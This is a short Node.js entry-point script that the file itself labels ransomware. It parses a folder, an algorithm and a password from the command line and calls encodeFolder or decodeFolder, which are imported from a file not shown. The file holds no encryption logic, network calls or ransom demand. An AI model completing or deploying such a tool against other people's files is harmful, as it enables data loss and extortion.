import dotenv from 'dotenv';
import logger from './utils/logger';

import { encodeFolder, decodeFolder } from './app';

dotenv.config();
const {
  argv: { f: FOLDER, a: ALGORITHM, p: PASSWORD, d, e },
} = require('yargs')
  .usage(
    'Usage: $0 --f [folder] --a [algorithm] --p [password] --d (decode)  --e (encode)'
  )
  .boolean(['d', 'e'])
  .demandOption(['f', 'a', 'p']);

logger.debug(`Starting ransomware, logger in ${process.env.LOGGER_LEVEL} mode`);

try {
  if (d) {
    decodeFolder(FOLDER, ALGORITHM, PASSWORD);
  } else if (e) {
    encodeFolder(FOLDER, ALGORITHM, PASSWORD);
  } else {
    logger.error('Need a --d for decode or --e for encode');
  }
} catch (error) {
  logger.error(error);
}